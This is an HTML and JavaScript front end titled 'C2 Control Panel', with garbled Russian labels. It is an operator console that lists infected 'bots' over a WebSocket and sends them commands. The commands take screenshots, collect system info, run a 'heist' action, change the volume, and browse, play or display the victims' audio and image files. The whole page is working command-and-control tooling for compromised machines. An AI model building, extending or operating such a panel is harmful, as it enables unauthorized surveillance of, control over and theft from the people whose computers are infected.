<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>C2 Control Panel</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 20px; font-size: 14px; }
        .container { max-width: 1200px; margin: auto; display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
        .panel { background-color: #1e1e1e; border-radius: 8px; padding: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
        h1, h2 { color: #bb86fc; border-bottom: 2px solid #373737; padding-bottom: 10px; margin-top: 0; }
        #bot-list ul { list-style-type: none; padding: 0; margin: 0; max-height: 70vh; overflow-y: auto; }
        #bot-list li { padding: 12px; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; border-bottom: 1px solid #2a2a2a; }
        #bot-list li:last-child { border-bottom: none; }
        #bot-list li:hover { background-color: #333; }
        #bot-list li.selected { background-color: #bb86fc; color: #121212; font-weight: bold; }
        #controls-panel, #file-browser { display: none; }
        #log-container { position: fixed; bottom: 0; left: 0; width: 100%; background-color: #1e1e1e; box-shadow: 0 -4px 8px rgba(0,0,0,0.2); max-height: 200px; overflow-y: auto; z-index: 100; }
        #log { padding: 15px; font-family: "SF Mono", "Fira Code", "Consolas", monospace; font-size: 12px; white-space: pre-wrap; word-wrap: break-word; }
        .log-entry { margin-bottom: 5px; }
        .log-time { color: #777; margin-right: 10px; }
        button { background-color: #bb86fc; color: #121212; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; font-size: 14px; transition: background-color 0.2s; }
        button:hover { background-color: #a362fc; }
        .control-group { margin-bottom: 20px; }
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 15px; }
        .file-item { text-align: center; cursor: pointer; }
        .file-item img { width: 80px; height: 80px; object-fit: cover; border-radius: 6px; border: 2px solid #373737; }
        .file-item p { margin: 5px 0 0; font-size: 12px; word-break: break-all; }
        input[type="range"] { width: 100%; }
    </style>
</head>
<body>

<div class="container">
    <div class="panel" id="bot-list">
        <h2>–û–Ω–ª–∞–π–Ω –ë–æ—Ç—ã</h2>
        <ul id="bots"></ul>
    </div>
    <div class="panel" id="main-controls">
        <h2 id="selected-bot-header">–í—ã–±–µ—Ä–∏—Ç–µ –±–æ—Ç–∞</h2>
        <div id="controls-panel">
            <div class="control-group">
                <h3>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ</h3>
                <button onclick="sendCommand('screenshot')">–°–∫—Ä–∏–Ω—à–æ—Ç</button>
                <button onclick="sendCommand('sysinfo')">–ò–Ω—Ñ–æ –æ —Å–∏—Å—Ç–µ–º–µ</button>
                <button onclick="sendCommand('heist')">Heist</button>
            </div>
            <div class="control-group">
                <h3>–ì—Ä–æ–º–∫–æ—Å—Ç—å</h3>
                <input type="range" id="volume-slider" min="0" max="100" onchange="setVolume(this.value)">
                <button onclick="sendCommand('mute')">Mute/Unmute</button>
            </div>
            <div class="control-group" id="file-browser">
                <div id="audio-files">
                    <h3>–ê—É–¥–∏–æ</h3>
                    <div class="file-grid" id="audio-grid"></div>
                </div>
                <div id="image-files">
                    <h3>–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è</h3>
                    <div class="file-grid" id="image-grid"></div>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="log-container">
    <div id="log"></div>
</div>

<script>
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${wsProtocol}//${window.location.host}/ws`;
    let ws;
    let selectedBot = null;

    const botList = document.getElementById('bots');
    const controlsPanel = document.getElementById('controls-panel');
    const fileBrowser = document.getElementById('file-browser');
    const selectedBotHeader = document.getElementById('selected-bot-header');

    function log(message) {
        const logDiv = document.getElementById('log');
        const time = new Date().toLocaleTimeString();
        logDiv.innerHTML += `<div class="log-entry"><span class="log-time">[${time}]</span>${message}</div>`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    function connect() {
        ws = new WebSocket(wsUrl);

        ws.onopen = () => {
            log('–°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å C2 —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ.');
            ws.send(JSON.stringify({ type: 'operator' }));
        };

        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            switch (data.type) {
                case 'bot_list':
                    updateBotList(data.data);
                    break;
                case 'status':
                    log(data.data);
                    break;
                case 'bot_details':
                    if (data.bot_id === selectedBot) {
                        log(`–ü–æ–ª—É—á–µ–Ω—ã –¥–µ—Ç–∞–ª–∏ –¥–ª—è ${selectedBot}.`);
                        const botData = data.data;
                        updateFileList(botData.files);
                        updateVolumeSlider(botData.volume);
                    }
                    break;
            }
        };

        ws.onclose = () => {
            log('–°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å C2 –ø–æ—Ç–µ—Ä—è–Ω–æ. –ü–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥...');
            setTimeout(connect, 5000);
            controlsPanel.style.display = 'none';
        };

        ws.onerror = (error) => {
            log('–û—à–∏–±–∫–∞ WebSocket.');
            ws.close();
        };
    }

    function updateBotList(bots) {
        botList.innerHTML = '';
        if (bots.length === 0) {
            botList.innerHTML = '<li>–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –±–æ—Ç–æ–≤</li>';
        } else {
            bots.forEach(botId => {
                const li = document.createElement('li');
                li.textContent = botId;
                li.onclick = () => selectBot(botId);
                if (botId === selectedBot) {
                    li.className = 'selected';
                }
                botList.appendChild(li);
            });
        }
    }

    function selectBot(botId) {
        selectedBot = botId;
        log(`–í—ã–±—Ä–∞–Ω –±–æ—Ç: ${botId}`);

        document.querySelectorAll('#bots li').forEach(li => {
            li.classList.toggle('selected', li.textContent === botId);
        });
        selectedBotHeader.textContent = `–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ: ${botId}`;
        controlsPanel.style.display = 'block';

        const payload = { type: 'command', target_id: botId, action: 'get_details' };

        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(payload));
            log(`–ó–∞–ø—Ä–æ—à–µ–Ω—ã –¥–µ—Ç–∞–ª–∏ —É ${botId}...`);
        } else {
            log('–û—à–∏–±–∫–∞: WebSocket –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω.');
        }
    }

    function updateFileList(files) {
        const audioGrid = document.getElementById('audio-grid');
        const imageGrid = document.getElementById('image-grid');
        audioGrid.innerHTML = '';
        imageGrid.innerHTML = '';

        if (files) {
            fileBrowser.style.display = 'block';
            (files.audio || []).forEach(filename => {
                audioGrid.innerHTML += `<div class="file-item" onclick="sendCommand('play', {filename: '${filename}'})"><p>üéµ ${filename}</p></div>`;
            });
            (files.image || []).forEach(file => {
                const thumbnailSrc = file.thumbnail ? `data:image/jpeg;base64,${file.thumbnail}` : '';
                imageGrid.innerHTML += `<div class="file-item" onclick="sendCommand('show', {filename: '${file.filename}'})"><img src="${thumbnailSrc}" alt="${file.filename}"><p>${file.filename}</p></div>`;
            });
        } else {
             fileBrowser.style.display = 'none';
        }
    }

    function updateVolumeSlider(volume) {
        const slider = document.getElementById('volume-slider');
        // --- –í–û–¢–ò–°–ü–†–ê–í–õ–ï–ù–ù–ê–Ø –°–¢–†–û–ö–ê ---
        if (volume !== null && volume !== undefined) {
            slider.value = volume;
        }
    }

    function sendCommand(action, params = {}) {
        if (!selectedBot) {
            log('–û—à–∏–±–∫–∞: –±–æ—Ç –Ω–µ –≤—ã–±—Ä–∞–Ω.');
            return;
        }
        const payload = {
            type: 'command',
            target_id: selectedBot,
            action: action,
            ...params
        };
        ws.send(JSON.stringify(payload));
        log(`–ö–æ–º–∞–Ω–¥–∞ '${action}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –±–æ—Ç—É ${selectedBot}`);
    }

    function setVolume(level) {
        sendCommand('volume', { level: level });
    }

    connect();
</script>

</body>
</html>
